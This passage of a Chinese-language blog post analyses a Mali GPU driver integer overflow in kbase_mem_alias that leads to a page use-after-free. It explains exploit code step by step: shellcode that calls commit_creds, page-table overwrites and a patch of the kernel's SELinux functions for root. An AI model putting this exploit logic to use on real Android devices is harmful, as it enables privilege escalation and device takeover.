...</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        err = kbase_mmu_insert_pages(kctx-&gt;kbdev,</span><br><span class="line">                &amp;kctx-&gt;mmu,</span><br><span class="line">                reg-&gt;start_pfn,                        <span class="comment">//&lt;------ virtual address</span></span><br><span class="line">                kbase_get_gpu_phy_pages(reg),          <span class="comment">//&lt;------ backing pages</span></span><br><span class="line">                kbase_reg_current_backed_size(reg),    </span><br><span class="line">                reg-&gt;flags &amp; gwt_mask,</span><br><span class="line">                kctx-&gt;as_nr,</span><br><span class="line">                group_id);</span><br><span class="line">        ...</span><br><span class="line">    }</span><br><span class="line">    ...</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p>这将在由<code>reg-&gt;start_pfn</code>指定的地址处插入<code>backing pages</code>，该地址也是用户空间中内存区域的地址。</p>
<h3 id="Memory-alias"><a href="#Memory-alias" class="headerlink" title="Memory alias"></a>Memory alias</h3><p><code>KBASE_IOCTL_MEM_ALIAS</code> 允许多个内存区域共享相同的 <code>backing pages</code>，在 <a class="link" target="_blank" rel="noopener" href="https://android.googlesource.com/kernel/google-modules/gpu/+/refs/tags/android-12.0.0_r0.42/mali_kbase/mali_kbase_mem_linux.c#1710">kbase_mem_alias <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 中实现，接受一个 stride 参数，以及一个 <code>base_mem_aliasing_info</code> 数组，用于指定为别名区域提供支持的内存区域。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">kbase_ioctl_mem_alias</span> <span class="title">alias</span> =</span> {<span class="number">0</span>};</span><br><span class="line"> alias.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_WR;</span><br><span class="line"> alias.in.stride = <span class="number">4</span>;</span><br><span class="line"> alias.in.nents = <span class="number">2</span>;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">base_mem_aliasing_info</span> <span class="title">ai</span>[2];</span></span><br><span class="line"> ai[<span class="number">0</span>].handle.basep.handle = region1;</span><br><span class="line"> ai[<span class="number">1</span>].handle.basep.handle = region2;</span><br><span class="line"> ai[<span class="number">0</span>].length = <span class="number">0x3</span>;</span><br><span class="line"> ai[<span class="number">1</span>].length = <span class="number">0x3</span>;</span><br><span class="line"> ai[<span class="number">0</span>].offset = <span class="number">0</span>;</span><br><span class="line"> ai[<span class="number">1</span>].offset = <span class="number">0</span>;</span><br><span class="line"> alias.in.aliasing_info = (<span class="type">uint64_t</span>)(&amp;(ai[<span class="number">0</span>]));</span><br><span class="line"> ioctl(mali_fd, KBASE_IOCTL_MEM_ALIAS, &amp;al</span><br></pre></td></tr></table></figure></div>

<p>在上述，通过将这些区域 region1 和 region2 (两者都是已经映射到 GPU 的区域) 的地址作为 <code>base_mem_aliasing_info::handle::basep::handle</code> 传递，创建了一个由 region1 和 region2 支持的别名区域。</p>
<p><code>stride</code> 参数表示这<strong>两个别名区域之间的间隔</strong>（以页为单位），<code>nents</code> 是 <code>backing regions</code> 的数量(注意这里不是<code>backing pages</code>)，所创建的结果区域的大小为 <code>stride * nents</code> 页，参照下图：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2024-11-19_23-51-35.png" alt="Snipaste_2024-11-19_23-51-35"></p>
<p>橙色区域表示整个别名区域，该区域包含2 * 4 = 8页。实际上，只有6页被映射，并且分别由<code>region1</code>和<code>region2</code>的 <code>backing pages</code> 支持。如果别名区域的起始地址是<code>alias_start</code>，那么<code>alias_start</code>到<code>alias_start + 0x3000</code>（三页）之间的地址与<code>region1</code>存在别名关系，而<code>region2</code>与<code>alias_start + stride * 0x1000</code>到<code>alias_start + (stride + 3) * 0x1000</code>之间的地址存在别名关系。</p>
<p>这导致别名区域中有一些间隙未被映射。这可以从<code>kbase_gpu_mmap</code>中处理<code>KBASE_MEM_TYPE_ALIAS</code>内存区域的方式中看出：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (reg-&gt;gpu_alloc-&gt;type == KBASE_MEM_TYPE_ALIAS) {</span><br><span class="line">    u64 <span class="type">const</span> stride = alloc-&gt;imported.alias.stride;</span><br><span class="line"></span><br><span class="line">    KBASE_DEBUG_ASSERT(alloc-&gt;imported.alias.aliased);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; alloc-&gt;imported.alias.nents; i++) {</span><br><span class="line">        <span class="keyword">if</span> (alloc-&gt;imported.alias.aliased[i].alloc) {</span><br><span class="line">            err = kbase_mmu_insert_pages(kctx-&gt;kbdev,</span><br><span class="line">                    &amp;kctx-&gt;mmu,</span><br><span class="line">                    reg-&gt;start_pfn + (i * stride),                  <span class="comment">//&lt;------ each region maps at reg-&gt;start_pfn + (i * stride)</span></span><br><span class="line">                    alloc-&gt;imported.alias.aliased[i].alloc-&gt;pages + alloc-&gt;imported.alias.aliased[i].offset,</span><br><span class="line">                    alloc-&gt;imported.alias.aliased[i].length,</span><br><span class="line">                    reg-&gt;flags &amp; gwt_mask,</span><br><span class="line">                    kctx-&gt;as_nr,</span><br><span class="line">                    group_id);</span><br><span class="line">            ...</span><br><span class="line">   }</span><br><span class="line">   ...</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p>从上面的代码可以看到<code>reg-&gt;start_pfn + (i * stride)</code> 是对应 region 开始的别名内存区域开始映射的起始位置。</p>
<h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>根据前面的内容，可以知道别名区域<code>alias region</code>的大小为<code>stride*nents</code>，代码如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">u64 <span class="title function_">kbase_mem_alias</span><span class="params">(<span class="keyword">struct</span> kbase_context *kctx, u64 *flags, u64 stride,</span></span><br><span class="line"><span class="params">            u64 nents, <span class="keyword">struct</span> base_mem_aliasing_info *ai,</span></span><br><span class="line"><span class="params">            u64 *num_pages)</span></span><br><span class="line">{</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> ((nents * stride) &gt; (U64_MAX / PAGE_SIZE))</span><br><span class="line">        <span class="comment">/* 64-bit address range is the max </span></span><br><span class="line"><span class="comment">        goto bad_size;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    /* calculate the number of pages this alias will cover */</span></span><br><span class="line">    *num_pages = nents * stride;         <span class="comment">//&lt;---- size of region</span></span><br></pre></td></tr></table></figure></div>

<p>虽然存在 <code>(nents * stride) &gt; (U64_MAX / PAGE_SIZE)</code> 检查，但是并没有做溢出检查，因此这里存在整数溢出，设想下面一个场景：</p>
<p>首先，分配三个<code>0x1000 * 3</code>大小的区域（<code>region1</code>、<code>region2</code>和<code>region3</code>）分配给GPU并建立映射，并将它们的起始地址分别标记为<code>region1_start</code>、<code>region2_start</code>和<code>region3_start</code>。</p>
<p>然后，创建一个别名区域，其步长（<code>stride</code>）为<code>2**63 + 1</code>，<code>nents</code>（元素数量）为2，并建立映射。由于整数溢出，别名区域的大小变为2页，特别是，别名区域的起始地址 <code>alias_start  = region3_start - 0x2000</code>，其中0x2000是别名区域的大小，当别名区域映射到GPU时，<code>kbase_gpu_mmap</code>将在<code>alias_start</code>处插入三个页面。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (reg-&gt;gpu_alloc-&gt;type == KBASE_MEM_TYPE_ALIAS) {</span><br><span class="line">    u64 <span class="type">const</span> stride = alloc-&gt;imported.alias.stride;</span><br><span class="line"></span><br><span class="line">    KBASE_DEBUG_ASSERT(alloc-&gt;imported.alias.aliased);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; alloc-&gt;imported.alias.nents; i++) {</span><br><span class="line">        <span class="keyword">if</span> (alloc-&gt;imported.alias.aliased[i].alloc) {</span><br><span class="line">            err = kbase_mmu_insert_pages(kctx-&gt;kbdev,</span><br><span class="line">                    &amp;kctx-&gt;mmu,</span><br><span class="line">                    reg-&gt;start_pfn + (i * stride),           <span class="comment">//&lt;------- insert pages at reg-&gt;start_pfn, which is alias_start</span></span><br><span class="line">                    alloc-&gt;imported.alias.aliased[i].alloc-&gt;pages + alloc-&gt;imported.alias.aliased[i].offset,</span><br><span class="line">                    alloc-&gt;imported.alias.aliased[i].length, <span class="comment">//&lt;------- length is the length of the alias region, which is 3</span></span><br><span class="line">                    reg-&gt;flags &amp; gwt_mask,</span><br><span class="line">                    kctx-&gt;as_nr,</span><br><span class="line">                    group_id);</span><br><span class="line">            ...</span><br><span class="line">   }</span><br><span class="line">   ...</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p>由于 <code>region1</code> 的 <code>backing pages</code> 大小为 0x3000，而对应<code>region3_start</code>位于<code>alias_start + 0x2000</code>处，因此会导致<code>region_1</code>中一个page大小的页面被映射到 <code>region3</code> 的区域当中，具体情况如下：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2024-11-20_16-34-11.png" alt="Snipaste_2024-11-20_16-34-11"></p>
<p>图中右侧的红色矩形表示在重新映射发生后，同时可以被 <code>region1_start + 0x2000</code> 和 <code>region3_start</code> 使用的一个页面。由于标记为红色的<code>backing page</code>同时还由<code>alias region</code>所拥有，即如果这两个区域（<code>region_start &amp; alias</code>）都取消映射，则该页面将被释放并回收到内存池中。</p>
<p>如果在这时候取消这两个区域的映射（对应的页面会被释放到内存池<code>memory region</code>当中），意味着 GPU 仍然可以通过访问 <code>region3_start</code>处的地址来访问这个已被释放的页面，从而顺利完成 UAF 的效果。</p>
<p>剩下的方法与 <code>GHSL-2023-005</code> 中所采用的方法一致，通过堆风水将 <code>backing page</code> 释放到 <code>next_pool</code> 中，然后通过 PGD 分配也会从该内存池中获取页面，从而相当于我们可以通过控制该 UAF 页面来实现对，PGD 页表的读写，从而实现任意物理内存读写这一强大原语。</p>
<h2 id="explain-exp"><a href="#explain-exp" class="headerlink" title="explain exp"></a>explain exp</h2><h3 id="write-adrp"><a href="#write-adrp" class="headerlink" title="write_adrp"></a>write_adrp</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32_t</span> <span class="title function_">write_adrp</span><span class="params">(<span class="type">int</span> rd, <span class="type">uint64_t</span> pc, <span class="type">uint64_t</span> label)</span> {</span><br><span class="line">  <span class="type">uint64_t</span> pc_page = pc &gt;&gt; <span class="number">12</span>;</span><br><span class="line">  <span class="type">uint64_t</span> label_page = label &gt;&gt; <span class="number">12</span>;</span><br><span class="line">  <span class="type">int64_t</span> offset = (label_page - pc_page) &lt;&lt; <span class="number">12</span>;</span><br><span class="line">  <span class="type">int64_t</span> immhi_mask = <span class="number">0xffffe0</span>;</span><br><span class="line">  <span class="type">int64_t</span> immhi = offset &gt;&gt; <span class="number">14</span>;</span><br><span class="line">  <span class="type">int32_t</span> immlo = (offset &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x3</span>;</span><br><span class="line">  <span class="type">uint32_t</span> adpr = rd &amp; <span class="number">0x1f</span>;</span><br><span class="line">  adpr |= (<span class="number">1</span> &lt;&lt; <span class="number">28</span>);</span><br><span class="line">  adpr |= (<span class="number">1</span> &lt;&lt; <span class="number">31</span>); <span class="comment">//op</span></span><br><span class="line">  adpr |= immlo &lt;&lt; <span class="number">29</span>;</span><br><span class="line">  adpr |= (immhi_mask &amp; (immhi &lt;&lt; <span class="number">5</span>));</span><br><span class="line">  <span class="keyword">return</span> adpr;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fixup_root_shell</span><span class="params">(<span class="type">uint64_t</span> init_cred, <span class="type">uint64_t</span> commit_cred, <span class="type">uint64_t</span> read_enforce, <span class="type">uint32_t</span> add_init, <span class="type">uint32_t</span> add_commit)</span> {</span><br><span class="line"></span><br><span class="line">  <span class="type">uint32_t</span> init_adpr = write_adrp(<span class="number">0</span>, read_enforce, init_cred);</span><br><span class="line">  <span class="comment">//Sets x0 to init_cred</span></span><br><span class="line">  root_code[ADRP_INIT_INDEX] = init_adpr;</span><br><span class="line">  root_code[ADD_INIT_INDEX] = add_init;</span><br><span class="line">  <span class="comment">//Sets x8 to commit_creds</span></span><br><span class="line">  root_code[ADRP_COMMIT_INDEX] = write_adrp(<span class="number">8</span>, read_enforce, commit_cred);</span><br><span class="line">  root_code[ADD_COMMIT_INDEX] = add_commit;</span><br><span class="line">  root_code[<span class="number">4</span>] = <span class="number">0xa9bf7bfd</span>; <span class="comment">// stp x29, x30, [sp, #-0x10]</span></span><br><span class="line">  root_code[<span class="number">5</span>] = <span class="number">0xd63f0100</span>; <span class="comment">// blr x8</span></span><br><span class="line">  root_code[<span class="number">6</span>] = <span class="number">0xa8c17bfd</span>; <span class="comment">// ldp x29, x30, [sp], #0x10</span></span><br><span class="line">  root_code[<span class="number">7</span>] = <span class="number">0xd65f03c0</span>; <span class="comment">// ret</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p>这里需要先解释一下 adrp 指令，ADRP (Add Relative to Instruction Pointer) 是 ARM64 架构中的一条指令，用于将当前指令的程序计数器 (PC) 值与一个相对偏移量相加，得到一个目标地址，并将这个地 址存储到一个寄存器中。以下是 ADRP 指令的构成：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2024-11-28_15-53-56.png" alt="Snipaste_2024-11-28_15-53-56"></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32_t</span> init_adpr = write_adrp(<span class="number">0</span>, read_enforce, init_cred);</span><br><span class="line"><span class="comment">//Sets x0 to init_cred</span></span><br><span class="line">root_code[ADRP_INIT_INDEX] = init_adpr;</span><br><span class="line">root_code[ADD_INIT_INDEX] = add_init;</span><br></pre></td></tr></table></figure></div>

<p>这里需要说明的是ARMv8采用的是定长指令集，这里是32位，<code>write_adrp</code>负责生成一条<code>adrp</code>指令，剩下两条指令解释如下：</p>
<p> <strong>ADRP 和 ADD 的组合原理</strong></p>
<p>​	•	ADRP<strong>（Address of Page Relocatable Page）</strong>:</p>
<p>​	•	将页对齐的地址加载到寄存器中，即目标地址的高位部分。</p>
<p>​	•	它只计算到 4KB 页的基地址，因此低 12 位总是被截断为 0。</p>
<p>​	•	ADD<strong>（加法指令）</strong>：</p>
<p>​	•	用于修正 ADRP 产生的基地址，将目标地址的低 12 位（偏移）添加到寄存器中。</p>
<p>由于 ADRP 只能处理 4KB 页对齐的地址，但实际的目标地址可能位于某个页内的特定偏移位置。例如：</p>
<p>​	•	假设 label 地址是 0x12345678。</p>
<p>​	•	ADRP 只能加载 0x12345000（页对齐的高地址）。</p>
<p>​	•	ADD 则需要将偏移 0x678 添加到 ADRP 结果中</p>
<h3 id="map-gpu"><a href="#map-gpu" class="headerlink" title="map_gpu"></a>map_gpu</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">map_gpu</span><span class="params">(<span class="type">int</span> mali_fd, <span class="type">unsigned</span> <span class="type">int</span> pages, <span class="type">bool</span> read_only, <span class="type">int</span> group)</span> {</span><br><span class="line">  <span class="class"><span class="keyword">union</span> <span class="title">kbase_ioctl_mem_alloc</span> <span class="title">alloc</span> =</span> {<span class="number">0</span>};</span><br><span class="line">  alloc.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR | (group &lt;&lt; <span class="number">22</span>);</span><br><span class="line">  <span class="type">int</span> prot = PROT_READ | PROT_WRITE;</span><br><span class="line">  <span class="keyword">if</span> (!read_only) {</span><br><span class="line">    alloc.in.flags |= BASE_MEM_PROT_GPU_WR;</span><br><span class="line">    prot |= PROT_WRITE;</span><br><span class="line">  }</span><br><span class="line">  alloc.in.va_pages = pages;</span><br><span class="line">  alloc.in.commit_pages = pages;</span><br><span class="line">  mem_alloc(mali_fd, &amp;alloc);</span><br><span class="line">  <span class="type">void</span>* region = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span> * pages, prot, MAP_SHARED, mali_fd, alloc.out.gpu_va);</span><br><span class="line">  <span class="keyword">if</span> (region == MAP_FAILED) {</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"mmap failed"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> region;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_to</span><span class="params">(<span class="type">int</span> mali_fd, <span class="type">uint64_t</span> gpu_addr, <span class="type">uint64_t</span> value, <span class="type">int</span> atom_number, <span class="keyword">enum</span> mali_write_value_type type)</span> {</span><br><span class="line">  <span class="type">void</span>* jc_region = map_gpu(mali_fd, <span class="number">1</span>, <span class="literal">false</span>, <span class="number">0</span>);	<span class="comment">// --&gt; 1</span></span><br><span class="line">  <span class="comment">//....</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">drain_mem_pool</span><span class="params">(<span class="type">int</span> mali_fd)</span> {</span><br><span class="line">  <span class="keyword">return</span> map_gpu(mali_fd, POOL_SIZE, <span class="literal">false</span>, <span class="number">1</span>); <span class="comment">// --&gt; 2</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">run_exploit</span><span class="params">()</span> {</span><br><span class="line">  <span class="type">int</span> mali_fd = open_dev(MALI);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//Regions for triggering the bug</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) {</span><br><span class="line">    <span class="type">void</span>* region = map_gpu(mali_fd, <span class="number">3</span>, <span class="literal">false</span>, <span class="number">1</span>); <span class="comment">// --&gt; 3</span></span><br><span class="line">    gpu_va[i] = (<span class="type">uint64_t</span>)region;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p><code>map_gpu</code>中的<code>group</code>指定了申请的内容属于哪个组，在这个例子中，我们在 <code>write_to</code> 的时候设置的<code>group</code>为0，而触发漏洞的<code>group</code>设置为1，因此可以将这两块内存隔离，而不受影响。</p>
<h3 id="write-func"><a href="#write-func" class="headerlink" title="write_func"></a>write_func</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> <span class="title function_">set_addr_lv3</span><span class="params">(<span class="type">uint64_t</span> addr)</span> {</span><br><span class="line">  <span class="type">uint64_t</span> pfn = addr &gt;&gt; PAGE_SHIFT;</span><br><span class="line">  pfn &amp;= ~ <span class="number">0x1FF</span>UL;</span><br><span class="line">  pfn |= <span class="number">0x100</span>UL;</span><br><span class="line">  <span class="keyword">return</span> pfn &lt;&lt; PAGE_SHIFT;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint64_t</span> <span class="title function_">compute_pt_index</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">int</span> level)</span> {</span><br><span class="line">  <span class="type">uint64_t</span> vpfn = addr &gt;&gt; PAGE_SHIFT;</span><br><span class="line">  vpfn &gt;&gt;= (<span class="number">3</span> - level) * <span class="number">9</span>;</span><br><span class="line">  <span class="keyword">return</span> vpfn &amp; <span class="number">0x1FF</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_func</span><span class="params">(<span class="type">int</span> mali_fd, <span class="type">uint64_t</span> func, <span class="type">uint64_t</span>* reserved, <span class="type">uint64_t</span> size, <span class="type">uint32_t</span>* shellcode, <span class="type">uint64_t</span> code_size)</span> {</span><br><span class="line">  <span class="type">uint64_t</span> func_offset = (func + KERNEL_BASE) % <span class="number">0x1000</span>;</span><br><span class="line">  <span class="type">uint64_t</span> curr_overwrite_addr = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i++) {</span><br><span class="line">    <span class="type">uint64_t</span> base = reserved[i];</span><br><span class="line">    <span class="type">uint64_t</span> end = reserved[i] + RESERVED_SIZE * <span class="number">0x1000</span>;</span><br><span class="line">    <span class="type">uint64_t</span> start_idx = compute_pt_index(base, <span class="number">3</span>);</span><br><span class="line">    <span class="type">uint64_t</span> end_idx = compute_pt_index(end, <span class="number">3</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"===========value i = %d ===============\n"</span>, i);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint64_t</span> addr = base; addr &lt; end; addr += <span class="number">0x1000</span>) {</span><br><span class="line">      <span class="type">uint64_t</span> overwrite_addr = set_addr_lv3(addr);</span><br><span class="line">      <span class="keyword">if</span> (curr_overwrite_addr != overwrite_addr) {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"base == %lx\n"</span>, base);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"end == %lx\n"</span>, end);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"overwrite_addr == %lx\n"</span>, overwrite_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"curr_overwrite_addr == %lx\n"</span>, curr_overwrite_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"overwrite addr : %lx %lx\n"</span>, overwrite_addr + func_offset, func_offset);</span><br><span class="line">        curr_overwrite_addr = overwrite_addr;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> code = code_size - <span class="number">1</span>; code &gt;= <span class="number">0</span>; code--) {</span><br><span class="line">          write_to(mali_fd, overwrite_addr + func_offset + code * <span class="number">4</span>, shellcode[code], atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_32);</span><br><span class="line">        }</span><br><span class="line">        usleep(<span class="number">300000</span>);</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">  <span class="type">uint64_t</span> avc_deny_addr = (((avc_deny + KERNEL_BASE) &gt;&gt; PAGE_SHIFT) &lt;&lt; PAGE_SHIFT)| <span class="number">0x443</span>;</span><br><span class="line">  <span class="comment">//Writing to gpu_va[1] will now overwrite the level 3 pgd in one of the reserved pages mapped earlier.</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) {</span><br><span class="line">    write_to(mali_fd, gpu_va[<span class="number">1</span>] + i * <span class="number">0x1000</span> + OVERWRITE_INDEX * <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>), avc_deny_addr, atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);</span><br><span class="line">  }</span><br><span class="line">  usleep(<span class="number">100000</span>);</span><br><span class="line">  <span class="comment">//Go through the reserve pages addresses to write to sel_read_enforce with our own shellcode</span></span><br><span class="line">  write_func(mali_fd, avc_deny, &amp;(reserved[<span class="number">0</span>]), TOTAL_RESERVED_SIZE/RESERVED_SIZE, &amp;(permissive[<span class="number">0</span>]), <span class="keyword">sizeof</span>(permissive)/<span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">  debug();</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p>上面 <code>for</code> 循环中的 <code>write_to</code> 用于覆盖页表项，注意这里的<code>OVERWRITE_INDEX</code> 的值为 <code>0x100 = 256</code>，此时可以理解为<code>gpu_va[1] + i * 0x1000</code>已经指向了一张 <code>level 3 pgd</code> 页表，我们修改了第 256 个页表项的内容（位于<code>0x100*8 = 0x800</code>处），修改的内容为<code>avc_deny</code>这个函数物理地址所对应的<strong>页帧号</strong>，这一操作通过<code>(((avc_deny + KERNEL_BASE) &gt;&gt; PAGE_SHIFT) &lt;&lt; PAGE_SHIFT)| 0x443</code> 完成，其中 0x443 是对应页表项低 12位的属性字段的值（具体可参考armV8 文档）用来保证页表项有效且可对页面进行读写。</p>
<p>在修改了页表项之后，此时 <code>reserved[i]</code>中的某一页已经指向了对应的<code>avc_deny</code>函数所在的页面，一种暴力的方法是我们直接对遍历每一个<code>reserved[i] + j * 0x1000 </code> 修改对应的<code>avc_deny</code>函数偏移处的代码，但实际上完全不用这么做，armV8 采用的是三级页表，总共的有效地址位数为<code>3 * 9 + 12 = 39</code>，其中三级页表对应的索引为 <code>addr[20:12]</code>，由于我们将 <code>OVERWRITE_INDEX</code>设置为了256，因此只要对应虚拟地址三级索引设置为<code>0x100</code>，我们就能够定位到所修改的 evil 页表项的位置，这也解释了<code>set_addr_lv3</code>中为什么有了这段代码 <code>  pfn &amp;= ~ 0x1FFUL; pfn |= 0x100UL;</code>，也就意味着仅仅需要关注<code>reserved[i] + j*0x1000 </code> 虚拟地址中对应一级索引和二级索引不一样的地址就行。</p>
